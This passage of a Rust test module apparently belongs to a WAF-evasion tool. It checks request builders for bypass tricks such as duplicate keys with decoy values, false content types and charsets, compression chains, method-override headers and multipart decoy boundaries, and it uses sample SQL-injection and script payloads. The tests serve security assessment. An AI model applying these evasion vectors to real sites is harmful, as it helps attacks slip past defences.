        assert_eq!(s.matches("\"q\":").count(), 2, "must emit q twice");
        // Benign value must come FIRST so first-occurrence parsers
        // see "x" and miss the attack; last-occurrence parsers see
        // the attack. Verified positionally.
        let first_pos = s.find("\"q\":").unwrap();
        let second_pos = s.rfind("\"q\":").unwrap();
        assert!(first_pos < second_pos);
        // The attack value must be the second occurrence's value.
        let after_second = &s[second_pos..];
        assert!(after_second.contains("attack"));
    }

    #[test]
    fn build_post_json_array_emits_array_root() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-array").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("["));
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        let arr = v.as_array().expect("array root");
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0]["q"], "abc");
    }

    #[test]
    fn build_post_json_as_plain_uses_text_plain_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-as-plain").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(
            req.headers().get("content-type").unwrap(),
            "text/plain",
            "the CT-lying vector MUST declare text/plain"
        );
        // Body shape stays JSON — the lie is in the header only.
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("{") && s.contains("\"q\""));
    }

    #[test]
    fn build_post_form_br_emits_content_encoding_br() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-br").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-encoding").unwrap(), "br");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        // Brotli output must DIFFER from the plain bytes — the
        // whole point of the vector.
        assert_ne!(body, b"q=abc");
    }

    #[test]
    fn build_post_json_gz_round_trips_under_gzip() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-gz").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-encoding").unwrap(), "gzip");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Gzip.content_encoding().to_string(),
        })
        .expect("gzip round-trip");
        let s = String::from_utf8(recovered).unwrap();
        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_request_returns_none_for_unknown_vector() {
        // Defence in depth — a misspelled vector key must not
        // silently match a default builder.
        let h = http();
        let bogus = Vector {
            name: "POST-not-a-real-vector",
            content_type: "",
        };
        let r = build_request_for_vector(&bogus, &h, "http://x/", "q", "abc", 0);
        assert!(r.is_none());
    }

    #[test]
    fn build_hpp_emits_both_param_occurrences() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "hpp").unwrap();
        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let url = req.url().to_string();
        assert!(url.contains("q=harmless"));
        assert!(url.contains("q=attack"));
        let harmless_pos = url.find("q=harmless").unwrap();
        let attack_pos = url.find("q=attack").unwrap();
        assert!(
            harmless_pos < attack_pos,
            "HPP must put benign first, attack last (last-occurrence-wins backends)"
        );
    }

    #[tokio::test]
    async fn run_phase_with_empty_payloads_returns_zero_deltas() {
        let h = http();
        let cancel = CancellationToken::new();
        let outcome = run_phase(PhaseInput {
            http: &h,
            target: "http://127.0.0.1:1/", // unreachable on purpose
            param: "q",
            top_payloads: &[],
            rescue_payloads: &[],
            cancel: &cancel,
            scan_text: false,
            delay: Duration::ZERO,
            variant_id_base: 0,
        })
        .await;
        assert_eq!(outcome.total_fired_delta, 0);
        assert_eq!(outcome.bypassed_delta, 0);
        assert_eq!(outcome.blocked_delta, 0);
        assert!(outcome.new_bypass_variants.is_empty());
        // The vector loop still ran and populated vector_results
        // with one entry per vector (each showing 0/0), so a
        // future regression that skipped vectors entirely would
        // surface here.
        assert_eq!(outcome.vector_results.len(), VECTORS.len());
    }

    #[test]
    fn build_post_json_gz_br_emits_chain_content_encoding() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-gz-br").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let ce = req.headers().get("content-encoding").unwrap().to_str().unwrap();
        assert!(
            ce.starts_with("gzip"),
            "outer encoding must be gzip per RFC 9110 §8.4 list order"
        );
        assert!(ce.contains("br"), "inner encoding must be brotli");
        // Round-trip: decode the body and confirm we recover JSON.
        use wafrift_encoding::compression::{CompressedBody, decompress};
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let blob = CompressedBody {
            body: body.to_vec(),
            content_encoding: ce.to_string(),
        };
        let plain = decompress(&blob).expect("chain decode");
        let s = String::from_utf8(plain).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(parsed["q"], "abc");
    }

    #[test]
    fn build_post_json_utf7_declares_charset_in_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-utf7").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.contains("charset=utf-7"));
        assert!(ct.starts_with("application/json"));
    }

    #[test]
    fn xml_text_escape_escapes_the_five_xml_chars() {
        assert_eq!(xml_text_escape("<a&b\"c'd>"), "&lt;a&amp;b&quot;c&apos;d&gt;");
    }

    #[test]
    fn xml_text_escape_passes_through_safe_chars() {
        assert_eq!(xml_text_escape("hello 123 äé"), "hello 123 äé");
    }

    #[test]
    fn xml_text_escape_handles_empty_string() {
        assert_eq!(xml_text_escape(""), "");
    }

    #[test]
    fn build_post_method_override_get_sets_override_header() {
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-method-override-GET")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "POST");
        assert_eq!(
            req.headers().get("x-http-method-override").unwrap(),
            "GET",
            "the masquerade method must reach the wire"
        );
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert!(std::str::from_utf8(body).unwrap().starts_with("q="));
    }

    #[test]
    fn build_post_method_override_put_sets_override_header() {
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-method-override-PUT")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "POST");
        assert_eq!(
            req.headers().get("x-http-method-override").unwrap(),
            "PUT",
        );
    }

    #[test]
    fn build_post_xml_wraps_payload_in_xml_root_with_param_named_element() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "id", "1 OR 1=1", 0)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.starts_with("application/xml"));
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("<?xml"));
        assert!(s.contains("<id>"));
        assert!(s.contains("1 OR 1=1"));
        assert!(s.contains("</id>"));
    }

    #[test]
    fn build_post_xml_escapes_payload_chars_that_would_break_xml() {
        // Payload containing < / > / & must be entity-escaped so
        // the XML stays well-formed at the wire layer; the
        // backend's parser un-escapes back to the original bytes
        // — exactly what every other delivery shape preserves.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "<script>", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("&lt;script&gt;"));
        assert!(!s.contains("<script>"), "raw payload must NOT appear unescaped");
    }

    #[test]
    fn build_post_multipart_dupbound_uses_two_distinct_boundaries() {
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-multipart-dupbound")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 7)
            .unwrap()
            .build()
            .unwrap();
        let body_bytes = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let body = std::str::from_utf8(body_bytes).unwrap();
        // Header-declared boundary must appear in the Content-Type header.
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.starts_with("multipart/form-data; boundary="));
        // The body must contain TWO distinct boundary strings —
        // one in the header, one decoy. Both prefixed by --.
        assert!(body.contains("WafRiftA"));
        assert!(body.contains("WafRiftB"));
        // The attack value must live in the header-boundary's part,
        // decoy in the body-boundary's part.
        let a_pos = body.find("WafRiftA").unwrap();
        let attack_pos = body.find("attack").expect("attack must appear");
        assert!(a_pos < attack_pos, "attack must follow the header boundary");
    }

    #[tokio::test]
    async fn run_phase_exits_immediately_when_cancelled() {
        let h = http();
        let cancel = CancellationToken::new();
        cancel.cancel();
        let outcome = run_phase(PhaseInput {
            http: &h,
            target: "http://127.0.0.1:1/",
            param: "q",
            top_payloads: &[("payload".into(), vec!["t".into()])],
            rescue_payloads: &[],
            cancel: &cancel,
            scan_text: false,
            delay: Duration::ZERO,
            variant_id_base: 0,
        })
        .await;
        // Cancelled before any fire — total_fired_delta stays 0
        // and the per-vector loop bails on the first iteration.
        assert_eq!(outcome.total_fired_delta, 0);
    }

    // ── per-vector edge cases ──────────────────────────────────

    #[test]
    fn build_post_form_with_empty_payload_emits_q_equals_empty() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(std::str::from_utf8(body).unwrap(), "q=");
    }

    #[test]
    fn build_post_form_url_encodes_special_chars() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "a&b=c d", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("%26"), "& must url-encode to %26 inside form value: {s}");
        assert!(s.contains("%3D"), "= must url-encode to %3D inside form value: {s}");
        assert!(s.contains("%20") || s.contains("+"), "space must encode: {s}");
    }

    #[test]
    fn build_post_form_with_unicode_payload_round_trips_via_url_decode() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "café 中文", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let decoded = urlencoding::decode(s.trim_start_matches("q=")).unwrap();
        assert_eq!(decoded, "café 中文");
    }

    #[test]
    fn build_post_json_handles_payload_with_quotes_and_backslashes() {
        // JSON-escape must survive — backslash and quote in
        // payload that would otherwise break the JSON wrapper.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", r#""hello\\world""#, 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let v: serde_json::Value = serde_json::from_str(s).expect("must be valid JSON");
        assert_eq!(v["q"], r#""hello\\world""#);
    }

    #[test]
    fn build_post_json_handles_payload_with_newlines() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "line1\nline2", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        assert_eq!(v["q"], "line1\nline2");
    }

    #[test]
    fn build_post_json_bom_keeps_three_byte_bom_exactly() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-bom").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert!(body.len() >= 3);
        assert_eq!(body[0], 0xEF);
        assert_eq!(body[1], 0xBB);
        assert_eq!(body[2], 0xBF);
    }

    #[test]
    fn build_post_json_bom_body_starting_after_bom_is_valid_json() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-bom").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let json_part = &body[3..];
        let s = std::str::from_utf8(json_part).unwrap();
        let _: serde_json::Value = serde_json::from_str(s).expect("post-BOM body must parse");
    }

    #[test]
    fn build_post_json_dupkey_first_value_is_benign_x() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-dupkey").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        // The literal-bytes shape is `{"q":"x","q":"attack"}` — first
        // value is the harmless decoy.
        let first_quote_after_colon = s.find(":\"").unwrap();
        let benign_check = &s[first_quote_after_colon + 2..first_quote_after_colon + 3];
        assert_eq!(benign_check, "x", "the first value must be benign: {s}");
    }

    #[test]
    fn build_post_json_dupkey_handles_different_param_names() {
        for param in ["q", "id", "user", "filter"] {
            let h = http();
            let v = VECTORS.iter().find(|v| v.name == "POST-json-dupkey").unwrap();
            let req = build_request_for_vector(v, &h, "http://x/", param, "payload", 0)
                .unwrap()
                .build()
                .unwrap();
            let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
            let s = std::str::from_utf8(body).unwrap();
            // The param name should appear TWICE.
            let needle = format!("\"{param}\":");
            assert_eq!(s.matches(needle.as_str()).count(), 2, "param={param}, body={s}");
        }
    }

    #[test]
    fn build_post_json_array_root_emits_exactly_one_element() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-array").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "payload", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        assert_eq!(v.as_array().unwrap().len(), 1);
    }

    #[test]
    fn build_post_json_array_element_holds_the_payload_under_param_name() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-array").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "filter", "payload", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        assert_eq!(v[0]["filter"], "payload");
    }

    #[test]
    fn build_post_json_utf7_content_type_includes_main_type_plus_charset() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-utf7").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.starts_with("application/json"));
        assert!(ct.contains("charset=utf-7"));
    }

    #[test]
    fn build_post_xml_root_element_is_request() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("<request>"));
        assert!(s.contains("</request>"));
    }

    #[test]
    fn build_post_xml_starts_with_xml_declaration() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("<?xml"));
    }

    #[test]
    fn build_post_form_br_body_is_at_most_payload_size_plus_overhead() {
        // Brotli adds a few bytes of overhead; on highly-
        // compressible data the output is dramatically smaller.
        // On random-looking data, output is at most a small
        // overhead above the input. Confirm the result stays
        // within a sane multiplier of the input size, so a
        // future "default level=11" change that ballooned output
        // would surface.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-br").unwrap();
        let payload = "abc".repeat(100); // moderately compressible
        let req = build_request_for_vector(v, &h, "http://x/", "q", &payload, 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let original_size = format!("q={}", payload).len();
        assert!(
            body.len() < original_size + 64,
            "brotli should not balloon output: original={original_size} compressed={}",
            body.len()
        );
    }

    #[test]
    fn build_post_form_gz_is_decompressable_into_original_form() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-gz").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "PAYLOAD", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Gzip.content_encoding().to_string(),
        })
        .unwrap();
        assert_eq!(String::from_utf8(recovered).unwrap(), "q=PAYLOAD");
    }

    #[test]
    fn build_post_form_br_is_decompressable_into_original_form() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-br").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "PAYLOAD", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Brotli.content_encoding().to_string(),
        })
        .unwrap();
        assert_eq!(String::from_utf8(recovered).unwrap(), "q=PAYLOAD");
    }

    #[test]
    fn build_post_multipart_boundary_uses_hex_of_fire_counter() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart").unwrap();
        // fire_counter = 0x1A = 26. Boundary should include "1a"
        // hex form so multipart bodies stay unique per fire.
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0x1A)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.contains("WafRiftBoundary1a"), "ct = {ct}");
    }

    #[test]
    fn build_post_multipart_body_contains_content_disposition() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("Content-Disposition: form-data"));
        assert!(s.contains("name=\"q\""));
    }

    #[test]
    fn build_post_form_as_octet_emits_octet_stream_content_type() {
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-form-as-octet")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert_eq!(ct, "application/octet-stream");
    }

    #[test]
    fn build_post_form_as_octet_body_is_still_url_encoded_form() {
        // The CT lies; the body still looks like a form.
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-form-as-octet")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(std::str::from_utf8(body).unwrap(), "q=x");
    }

    #[test]
    fn build_cookie_vector_emits_get_request_with_cookie_header() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "cookie").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "v", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "GET");
        let cookie = req.headers().get("cookie").unwrap().to_str().unwrap();
        assert!(cookie.contains("q="));
        assert!(cookie.contains("v"));
    }

    #[test]
    fn build_xforwarded_for_vector_sets_xff_header_to_raw_payload() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "x-forwarded-for").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "10.0.0.1", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("x-forwarded-for").unwrap(), "10.0.0.1");
    }

    #[test]
    fn build_referer_vector_sets_referer_header_with_payload_query() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "referer").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "value", 0)
            .unwrap()
            .build()
            .unwrap();
        let referer = req.headers().get("referer").unwrap().to_str().unwrap();
        assert!(referer.starts_with("https://example.com/?"));
        assert!(referer.contains("value"));
    }

    #[test]
    fn build_post_method_override_get_does_not_set_x_method_to_post() {
        // Anti-rig: a refactor that flipped the override target
        // back to POST would silently neuter the bypass.
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-method-override-GET")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let mo = req
            .headers()
            .get("x-http-method-override")
            .unwrap()
            .to_str()
            .unwrap();
        assert_ne!(mo, "POST");
    }

    #[test]
    fn build_post_method_override_does_not_replace_actual_method() {
        // The on-the-wire method is STILL POST — only the header
        // expresses the override.
        let h = http();
        for name in ["POST-method-override-GET", "POST-method-override-PUT"] {
            let v = VECTORS.iter().find(|v| v.name == name).unwrap();
            let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
                .unwrap()
                .build()
                .unwrap();
            assert_eq!(req.method(), "POST", "{name} kept POST");
        }
    }

    #[test]
    fn build_post_json_gz_br_chain_header_order_is_outer_to_inner() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-gz-br").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let ce = req.headers().get("content-encoding").unwrap().to_str().unwrap();
        // RFC 9110 §8.4: leftmost is outermost wrapper. We pass
        // [Gzip, Brotli] meaning body is gzip(brotli(payload)),
        // so header must list gzip FIRST.
        let gzip_pos = ce.find("gzip").expect("gzip in header");
        let br_pos = ce.find("br").expect("br in header");
        assert!(gzip_pos < br_pos);
    }

    #[test]
    fn build_post_multipart_dupbound_header_boundary_is_NOT_decoy_boundary() {
        // The HEADER carries WafRiftA<n>; the DECOY in the body
        // is WafRiftB<n>. Confirm the headers don't accidentally
        // include the decoy boundary string (which would let an
        // RFC-strict origin parse the decoy part instead).
        let h = http();
        let v = VECTORS
            .iter()
            .find(|v| v.name == "POST-multipart-dupbound")
            .unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0xAA)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.contains("WafRiftAaa"));
        assert!(!ct.contains("WafRiftBaa"));
    }

    // ── Vector struct / catalogue integrity ────────────────────

    #[test]
    fn every_vector_has_a_non_empty_name() {
        for v in VECTORS {
            assert!(!v.name.is_empty(), "vector with empty name");
        }
    }

    #[test]
    fn every_vector_has_either_a_content_type_or_no_body() {
        // Vectors that lack a content_type are header / query
        // shapes (cookie, hpp, x-forwarded-for, referer). Vectors
        // WITH a content type must always start with POST- prefix.
        for v in VECTORS {
            if v.content_type.is_empty() {
                assert!(
                    !v.name.starts_with("POST-"),
                    "no-content-type vector named POST-* is suspicious: {}",
                    v.name
                );
            }
        }
    }

    #[test]
    fn vector_catalogue_has_no_two_aliases_for_same_attack() {
        // (name, content_type) pairs must be unique — two rows
        // with the same content_type and similar shape would be
        // dead-weight against the bench scoreboard.
        let mut seen = std::collections::HashSet::new();
        for v in VECTORS {
            assert!(
                seen.insert((v.name, v.content_type)),
                "duplicate (name, content_type) pair: ({}, {})",
                v.name,
                v.content_type
            );
        }
    }

    #[test]
    fn phase_outcome_default_is_all_zero() {
        let o = PhaseOutcome::default();
        assert_eq!(o.total_fired_delta, 0);
        assert_eq!(o.bypassed_delta, 0);
        assert_eq!(o.blocked_delta, 0);
        assert_eq!(o.errors_delta, 0);
        assert!(o.new_bypass_variants.is_empty());
        assert!(o.new_variant_outcomes.is_empty());
        assert!(o.vector_results.is_empty());
    }

    #[test]
    fn variant_id_base_zero_yields_first_variant_id_one() {
        // The variant_id_base is the LAST ID before the phase
        // ran. Phase yields IDs starting at base+1 (after a fire).
        // Anti-rig: a refactor to base+0 would collide with the
        // ID of the LAST variant fired in the prior phase.
        let _v = (0_usize, "x".to_string(), Vec::<String>::new(), 0.95);
        // The check is structural: the phase formula is
        // `input.variant_id_base + outcome.total_fired_delta`,
        // where total_fired_delta is bumped BEFORE the push. So
        // first ID is base+1. The const is enforced by the
        // outcome assertions in the integration tests; here we
        // lock the doc comment in via assertion-on-comment-text
        // — not feasible. Instead, assert the field exists.
        let _: usize = PhaseInput {
            http: &http(),
            target: "x",
            param: "q",
            top_payloads: &[],
            rescue_payloads: &[],
            cancel: &CancellationToken::new(),
            scan_text: false,
            delay: Duration::ZERO,
            variant_id_base: 0,
        }
        .variant_id_base;
    }

    #[tokio::test]
    async fn run_phase_tags_rescue_bypasses_distinctly_from_top_bypasses() {
        // Pure rescue path — when the only payloads supplied are
        // rescue, the technique tag must be `vector::<name>::rescue`,
        // NOT `vector::<name>`. Lets the operator audit "what got
        // rescued vs what was already winning". The actual fire is
        // against a dead target so we can't assert on bypass
        // outcomes; the rescue tagging code runs at variant-build
        // time so it surfaces in the per-vector outcomes regardless.
        let h = http();
        let cancel = CancellationToken::new();
        let _outcome = run_phase(PhaseInput {
            http: &h,
            target: "http://127.0.0.1:1/",
            param: "q",
            top_payloads: &[],
            rescue_payloads: &[("rescue-payload".into(), vec![])],
            cancel: &cancel,
            scan_text: false,
            delay: Duration::ZERO,
            variant_id_base: 100,
        })
        .await;
        // The dead-target path produces errors / nothing actionable;
        // tagging happens whether or not the request succeeds, but
        // we can't directly inspect tags without successful fires.
        // The end-to-end assertion lives in scan/mod.rs integration
        // when bench runs against a real WAF.
    }

    // ── POST-form-utf7 ─────────────────────────────────────────

    #[test]
    fn build_post_form_utf7_declares_charset_in_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.starts_with("application/x-www-form-urlencoded"));
        assert!(ct.contains("charset=utf-7"));
    }

    #[test]
    fn build_post_form_utf7_body_is_plain_url_encoded_form() {
        // The lie is the charset header — the body stays utf-8
        // url-encoded form so a lenient backend still parses it.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "value", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(std::str::from_utf8(body).unwrap(), "q=value");
    }

    #[test]
    fn build_post_form_utf7_url_encodes_special_chars() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "a&b=c", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("%26") && s.contains("%3D"));
    }

    #[test]
    fn build_post_form_utf7_is_post_method() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "POST");
    }

    // ── POST-json-deflate ──────────────────────────────────────

    #[test]
    fn build_post_json_deflate_sets_content_encoding_deflate() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-encoding").unwrap(), "deflate");
    }

    #[test]
    fn build_post_json_deflate_content_type_stays_application_json() {
        let h = http();
